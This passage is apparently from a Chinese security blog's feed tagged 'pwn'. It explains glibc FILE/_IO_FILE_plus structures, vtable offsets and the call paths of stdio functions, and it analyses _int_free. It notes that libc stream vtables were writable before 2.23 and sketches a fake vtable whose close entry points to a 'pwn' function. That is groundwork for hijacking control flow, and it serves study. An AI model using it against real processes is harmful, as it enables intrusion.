<p>同样，如果程序中不存在fopen等函数创建的_IO_FILE时，也可以选择stdin\stdout\stderr等位于libc.so中的_IO_FILE，这些流在printf\scanf等函数中就会被使用到。在libc2.23之前，这些vtable是可以写入并且不存在其他检测的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">print &amp;_IO_2_1_stdin_</div><div class="line">$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;</div><div class="line"></div><div class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FILE文件结构介绍]]></title>
      <url>/2018/06/22/FILE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<h1 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h1><h2 id="FILE介绍"><a href="#FILE介绍" class="headerlink" title="FILE介绍"></a>FILE介绍</h2><p>FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。 FILE结构在程序执行fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。</p>
<p>FILE结构定义在libio.h中，如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">struct _IO_FILE &#123;</div><div class="line">  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */</div><div class="line">#define _IO_file_flags _flags</div><div class="line"></div><div class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</div><div class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</div><div class="line">  char* _IO_read_ptr;   /* Current read pointer */</div><div class="line">  char* _IO_read_end;   /* End of get area. */</div><div class="line">  char* _IO_read_base;  /* Start of putback+get area. */</div><div class="line">  char* _IO_write_base; /* Start of put area. */</div><div class="line">  char* _IO_write_ptr;  /* Current put pointer. */</div><div class="line">  char* _IO_write_end;  /* End of put area. */</div><div class="line">  char* _IO_buf_base;   /* Start of reserve area. */</div><div class="line">  char* _IO_buf_end;    /* End of reserve area. */</div><div class="line">  /* The following fields are used to support backing up and undo. */</div><div class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</div><div class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</div><div class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</div><div class="line"></div><div class="line">  struct _IO_marker *_markers;</div><div class="line"></div><div class="line">  struct _IO_FILE *_chain;</div><div class="line"></div><div class="line">  int _fileno;</div><div class="line">#if 0</div><div class="line">  int _blksize;</div><div class="line">#else</div><div class="line">  int _flags2;</div><div class="line">#endif</div><div class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</div><div class="line"></div><div class="line">#define __HAVE_COLUMN /* temporary */</div><div class="line">  /* 1+column number of pbase(); 0 is unknown. */</div><div class="line">  unsigned short _cur_column;</div><div class="line">  signed char _vtable_offset;</div><div class="line">  char _shortbuf[1];</div><div class="line"></div><div class="line">  /*  char* _save_gptr;  char* _save_egptr; */</div><div class="line"></div><div class="line">  _IO_lock_t *_lock;</div><div class="line">#ifdef _IO_USE_OLD_IO_FILE</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值我们可以遍历所有的FILE结构。</p>
<p>在标准I/O库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于libc.so的数据段。而我们使用fopen创建的文件流是分配在堆内存上的。</p>
<p>我们可以在libc.so中找到stdin\stdout\stderr等符号，这些符号是指向FILE结构的指针，真正结构的符号是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">_IO_2_1_stderr_</div><div class="line">_IO_2_1_stdout_</div><div class="line">_IO_2_1_stdin_</div></pre></td></tr></table></figure>
<p>但是事实上_IO_FILE结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针vtable指向了一系列函数指针。</p>
<p>在libc2.23版本下，32位的vtable偏移为0x94，64位偏移为0x228</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct _IO_FILE_plus</div><div class="line">&#123;</div><div class="line">    _IO_FILE    file;</div><div class="line">    IO_jump_t   *vtable;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>vtable是IO_jump_t类型的指针，IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准IO函数中会调用这些函数指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">void * funcs[] = &#123;</div><div class="line">   1 NULL, // &quot;extra word&quot;</div><div class="line">   2 NULL, // DUMMY</div><div class="line">   3 exit, // finish</div><div class="line">   4 NULL, // overflow</div><div class="line">   5 NULL, // underflow</div><div class="line">   6 NULL, // uflow</div><div class="line">   7 NULL, // pbackfail</div><div class="line">   </div><div class="line">   8 NULL, // xsputn  #printf</div><div class="line">   9 NULL, // xsgetn</div><div class="line">   10 NULL, // seekoff</div><div class="line">   11 NULL, // seekpos</div><div class="line">   12 NULL, // setbuf</div><div class="line">   13 NULL, // sync</div><div class="line">   14 NULL, // doallocate</div><div class="line">   15 NULL, // read</div><div class="line">   16 NULL, // write</div><div class="line">   17 NULL, // seek</div><div class="line">   18 pwn,  // close</div><div class="line">   19 NULL, // stat</div><div class="line">   20 NULL, // showmanyc</div><div class="line">   21 NULL, // imbue</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>fread是标准IO库函数，作用是从文件流中读数据，函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;</div></pre></td></tr></table></figure>
<ul>
<li>buffer 存放读取数据的缓冲区。</li>
<li>size：指定每个记录的长度。</li>
<li>count： 指定记录的个数。</li>
<li>stream：目标文件流。</li>
<li>返回值：返回读取到数据缓冲区中的记录个数</li>
</ul>
<p>fread的代码位于/libio/iofread.c中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">_IO_size_t</div><div class="line">_IO_fread (buf, size, count, fp)</div><div class="line">     void *buf;</div><div class="line">     _IO_size_t size;</div><div class="line">     _IO_size_t count;</div><div class="line">     _IO_FILE *fp;</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在_IO_sgetn函数中会调用_IO_XSGETN，而_IO_XSGETN是_IO_FILE_plus.vtable中的函数指针，在调用这个函数时会首先取出vtable中的指针然后再进行调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">_IO_size_t</div><div class="line">_IO_sgetn (fp, data, n)</div><div class="line">     _IO_FILE *fp;</div><div class="line">     void *data;</div><div class="line">     _IO_size_t n;</div><div class="line">&#123;</div><div class="line">  return _IO_XSGETN (fp, data, n);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在默认情况下函数指针是指向_IO_file_xsgetn函数的，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if (fp-&gt;_IO_buf_base</div><div class="line">        &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</div><div class="line">      &#123;</div><div class="line">        if (__underflow (fp) == EOF)</div><div class="line">      break;</div><div class="line"></div><div class="line">        continue;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>fwrite同样是标准IO库函数，作用是向文件流写入数据，函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);</div></pre></td></tr></table></figure>
<ul>
<li>buffer:是一个指针，对fwrite来说，是要写入数据的地址;</li>
<li>size:要写入内容的单字节数;</li>
<li>count:要进行写入size字节的数据项的个数;</li>
<li>stream:目标文件指针;</li>
<li>返回值：实际写入的数据项个数count。</li>
</ul>
<p>fwrite的代码位于/libio/iofwrite.c中，函数名为_IO_fwrite。 在_IO_fwrite中主要是调用_IO_XSPUTN来实现写入的功能。</p>
<p>根据前面对_IO_FILE_plus的介绍，可知_IO_XSPUTN位于_IO_FILE_plus的vtable中，调用这个函数需要首先取出vtable中的指针，再跳过去进行调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">written = _IO_sputn (fp, (const char *) buf, request);</div></pre></td></tr></table></figure>
<p>在_IO_XSPUTN对应的默认函数_IO_new_file_xsputn中会调用同样位于vtable中的_IO_OVERFLOW</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/* Next flush the (full) buffer. */</div><div class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</div></pre></td></tr></table></figure>
<p>_IO_OVERFLOW默认对应的函数是_IO_new_file_overflow</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if (ch == EOF)</div><div class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</div><div class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</div><div class="line">  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */</div><div class="line">    if (_IO_do_flush (f) == EOF)</div><div class="line">      return EOF;</div></pre></td></tr></table></figure>
<p>在_IO_new_file_overflow内部最终会调用系统接口write函数</p>
<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen在标准IO库中用于打开文件，函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FILE *fopen(char *filename, *type);</div></pre></td></tr></table></figure>
<ul>
<li>filename:目标文件的路径</li>
<li>type:打开方式的类型</li>
<li>返回值:返回一个文件指针</li>
</ul>
<p>在fopen内部会创建FILE结构并进行一些初始化操作，下面来看一下这个过程</p>
<p>首先在fopen对应的函数__fopen_internal内部会调用malloc函数，分配FILE结构的空间。因此我们可以获知FILE结构是存储在堆上的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</div></pre></td></tr></table></figure>
<p>之后会为创建的FILE初始化vtable，并调用_IO_file_init进一步初始化操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</div><div class="line">_IO_file_init (&amp;new_f-&gt;fp);</div></pre></td></tr></table></figure>
<p>在_IO_file_init函数的初始化操作中，会调用_IO_link_in把新分配的FILE链入_IO_list_all为起始的FILE链表中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">_IO_link_in (fp)</div><div class="line">     struct _IO_FILE_plus *fp;</div><div class="line">&#123;</div><div class="line">    if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)</div><div class="line">    &#123;</div><div class="line">      fp-&gt;file._flags |= _IO_LINKED;</div><div class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</div><div class="line">      _IO_list_all = fp;</div><div class="line">      ++_IO_list_all_stamp;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后__fopen_internal函数会调用_IO_file_fopen函数打开目标文件，_IO_file_fopen会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口open函数，这里不再深入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)</div><div class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</div></pre></td></tr></table></figure>
<p>总结一下fopen的操作是</p>
<ul>
<li>使用malloc分配FILE结构</li>
<li>设置FILE结构的vtable</li>
<li>初始化分配的FILE结构</li>
<li>将初始化的FILE结构链入FILE结构链表中</li>
<li>调用系统调用打开文件</li>
</ul>
<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>fclose是标准IO库中用于关闭已打开文件的函数，其作用与fopen相反。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int fclose(FILE *stream)</div></pre></td></tr></table></figure>
<p>功能：关闭一个文件流，使用fclose就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
<p>fclose首先会调用_IO_unlink_it将指定的FILE从_chain链表中脱链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</div><div class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</div></pre></td></tr></table></figure>
<p>之后会调用_IO_file_close_it函数，_IO_file_close_it会调用系统接口close关闭文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</div><div class="line">    status = _IO_file_close_it (fp);</div></pre></td></tr></table></figure>
<p>最后调用vtable中的_IO_FINISH，其对应的是_IO_file_finish函数，其中会调用free函数释放之前分配的FILE结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_IO_FINISH (fp);</div></pre></td></tr></table></figure>
<h2 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h2><p>printf和puts是常用的输出函数，在printf的参数是以&#39;\n&#39;结束的纯字符串时，printf会被优化为puts函数并去除换行符。</p>
<p>puts在源码中实现的函数是_IO_puts，这个函数的操作与fwrite的流程大致相同，函数内部同样会调用vtable中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口write函数。</p>
<p>printf的调用栈回溯如下，同样是通过_IO_file_xsputn实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">vfprintf+11</div><div class="line">_IO_file_xsputn</div><div class="line">_IO_file_overflow</div><div class="line">funlockfile</div><div class="line">_IO_file_write</div><div class="line">write</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[free源码分析——2]]></title>
      <url>/2018/05/21/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/</url>
      <content type="html"><![CDATA[<h1 id="free源码分析—-int-free"><a href="#free源码分析—-int-free" class="headerlink" title="free源码分析—_int_free"></a>free源码分析—_int_free</h1><p>根据上一章的分析可知，如果一个chunk不是由mmap分配得到，就会调用<code>_int_free</code>进行释放。下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">void __libc_free(void *mem) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    p = mem2chunk(mem);</div><div class="line">    if (chunk_is_mmapped(p))&#123;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ar_ptr = arena_for_chunk(p);</div><div class="line">    _int_free(ar_ptr, p, 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="int-free第一部分"><a href="#int-free第一部分" class="headerlink" title="_int_free第一部分"></a>_int_free第一部分</h2><p>首先来看<code>_int_free</code>第一部分，为了便于分析，这里省略了一些不关键的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">static void _int_free(mstate av, mchunkptr p, int have_lock) &#123;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line">    mfastbinptr *fb;</div><div class="line">    mchunkptr nextchunk;</div><div class="line">    INTERNAL_SIZE_T nextsize;</div><div class="line">    int nextinuse;</div><div class="line">    INTERNAL_SIZE_T prevsize;</div><div class="line">    mchunkptr bck;</div><div class="line">    mchunkptr fwd;</div><div class="line"></div><div class="line">    const char *errstr = NULL;</div><div class="line">    int locked = 0;</div><div class="line">    size = chunksize(p);</div><div class="line"></div><div class="line">    if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK (size))) &#123;</div><div class="line">        goto errout;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    check_inuse_chunk(av, p);</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line"></div><div class="line">        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);</div><div class="line">        set_fastchunks(av);</div><div class="line">        unsigned int idx = fastbin_index(size);</div><div class="line">        fb = &amp;fastbin(av, idx);</div><div class="line"></div><div class="line">        mchunkptr old = *fb, old2;</div><div class="line">        unsigned int old_idx = ~0u;</div><div class="line">        do &#123;</div><div class="line">            if (have_lock &amp;&amp; old != NULL)</div><div class="line">                old_idx = fastbin_index(chunksize(old));</div><div class="line">            p-&gt;fd = old2 = old;</div><div class="line">        &#125; while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>第一部分首先是检查<code>size</code>变量的合法性，然后比较<code>get_max_fast()</code>判断<code>size</code>是否在fastbin的范围内，如果在fastbin的管理范围内，就通过<code>set_fastchunks</code>设置分配区的标志位表示fastbin有空闲chunk，接下来根据<code>size</code>获得即将添加的chunk在fastbin中的索引<code>idx</code>，并通过该索引获得头指针<code>fb</code>，最后通过CAS操作将该chunk添加到fastbin中。这里需要注意fastbin中存放的chunk是按照单向链表组织的。</p>
<h2 id="int-free第二部分"><a href="#int-free第二部分" class="headerlink" title="_int_free第二部分"></a>_int_free第二部分</h2><p>继续往下看，为了使整个代码结构清晰，这里保留了上一部分的if，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">static void _int_free(mstate av, mchunkptr p, int have_lock) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else if (!chunk_is_mmapped(p)) &#123;</div><div class="line"></div><div class="line">        nextchunk = chunk_at_offset(p, size);</div><div class="line">        nextsize = chunksize(nextchunk);</div><div class="line"></div><div class="line">        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);</div><div class="line"></div><div class="line">        if (!prev_inuse(p)) &#123;</div><div class="line">            prevsize = p-&gt;prev_size;</div><div class="line">            size += prevsize;</div><div class="line">            p = chunk_at_offset(p, -((long ) prevsize));</div><div class="line">            unlink(av, p, bck, fwd);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (nextchunk != av-&gt;top) &#123;</div><div class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</div><div class="line"></div><div class="line">            if (!nextinuse) &#123;</div><div class="line">                unlink(av, nextchunk, bck, fwd);</div><div class="line">                size += nextsize;</div><div class="line">            &#125; else</div><div class="line">                clear_inuse_bit_at_offset(nextchunk, 0);</div><div class="line"></div><div class="line">            bck = unsorted_chunks(av);</div><div class="line">            fwd = bck-&gt;fd;</div><div class="line">            if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</div><div class="line">                errstr = &quot;free(): corrupted unsorted chunks&quot;;</div><div class="line">                goto errout;</div><div class="line">            &#125;</div><div class="line">            p-&gt;fd = fwd;</div><div class="line">            p-&gt;bk = bck;</div><div class="line">            if (!in_smallbin_range(size)) &#123;</div><div class="line">                p-&gt;fd_nextsize = NULL;</div><div class="line">                p-&gt;bk_nextsize = NULL;</div><div class="line">            &#125;</div><div class="line">            bck-&gt;fd = p;</div><div class="line">            fwd-&gt;bk = p;</div><div class="line"></div><div class="line">            set_head(p, size | PREV_INUSE);</div><div class="line">            set_foot(p, size);</div><div class="line"></div><div class="line">            check_free_chunk(av, p);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        else &#123;</div><div class="line">            size += nextsize;</div><div class="line">            set_head(p, size | PREV_INUSE);</div><div class="line">            av-&gt;top = p;</div><div class="line">            check_chunk(av, p);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果将要释放的chunk不属于fastbin，且不是由mmap分配的，就首先获得下一个chunk的指针<code>nextchunk</code>和大小<code>nextsize</code>，如果前一个chunk空闲，就和前一个chunk合并，并通过<code>unlink</code>将该chunk从空闲链表中脱离。接下来，如果刚才前面取出的下一个chunk也为空闲，并且该chunk不是top chunk，则继续合并，否则将其设为空闲。再往下，就是取出unsortedbin的头指针，将合并后的chunk插入unsortedbin链表头部，并进行相应的设置。<br>如果下一个chunk为top chunk，就将要释放的chunk合并到top chunk中。</p>
<h2 id="int-free第三部分"><a href="#int-free第三部分" class="headerlink" title="_int_free第三部分"></a>_int_free第三部分</h2><p>继续往下看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">static void _int_free(mstate av, mchunkptr p, int have_lock) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else if (!chunk_is_mmapped(p)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if ((unsigned long) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</div><div class="line">            if (have_fastchunks(av))</div><div class="line">                malloc_consolidate(av);</div><div class="line"></div><div class="line">            if (av == &amp;main_arena) &#123;</div><div class="line">    #ifndef MORECORE_CANNOT_TRIM</div><div class="line">                if ((unsigned long) (chunksize(av-&gt;top))</div><div class="line">                        &gt;= (unsigned long) (mp_.trim_threshold))</div><div class="line">                    systrim(mp_.top_pad, av);</div><div class="line">    #endif</div><div class="line">            &#125; else &#123;</div><div class="line">                heap_info *heap = heap_for_ptr(top(av));</div><div class="line">                heap_trim(heap, mp_.top_pad);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        if (!have_lock) &#123;</div><div class="line">            assert(locked);</div><div class="line">            (void) mutex_unlock(&amp;av-&gt;mutex);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        munmap_chunk(p);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
